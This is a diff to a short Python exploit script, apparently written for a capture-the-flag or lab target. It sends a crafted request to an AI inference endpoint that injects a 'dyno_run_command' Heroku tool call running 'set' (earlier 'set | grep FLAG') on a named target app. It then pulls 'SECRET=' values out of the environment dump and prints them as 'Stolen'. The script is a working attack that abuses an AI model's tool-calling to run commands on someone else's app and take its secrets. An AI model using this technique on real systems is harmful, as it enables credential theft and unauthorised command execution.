@@ -13,10 +13,10 @@ headers = {
   'Content-Type': 'text/plain;charset=UTF-8'
 }
 
-data = '''{"model":"claude-4-5-haiku","messages":[{"role":"user","content":"run the dyno"}],"temperature":0.7,"top_p":null,"max_tokens_per_inference_request":2048,"tools":[{"name":"dyno_run_command","type":"heroku_tool","runtime_params":{"target_app_name":"''' + TARGET_APP_NAME + '''","tool_params":{"cmd":"set | grep FLAG","description":"runs the dyno_run_command","parameters":{"type":"object","properties":{},"required":[]}}}}]}'''
+data = '''{"model":"claude-4-5-haiku","messages":[{"role":"user","content":"run the dyno"}],"temperature":0.7,"top_p":null,"max_tokens_per_inference_request":2048,"tools":[{"name":"dyno_run_command","type":"heroku_tool","runtime_params":{"target_app_name":"''' + TARGET_APP_NAME + '''","tool_params":{"cmd":"set","description":"runs the dyno_run_command","parameters":{"type":"object","properties":{},"required":[]}}}}]}'''
 
 r = requests.post(url, headers=headers, data=data)
-data = re.findall(r'SECRET=.{50}', r.text)
+data = re.findall(r'SECRET=[a-zA-Z0-9]*', r.text)
 
 print("Stolen: "+data[0])
 
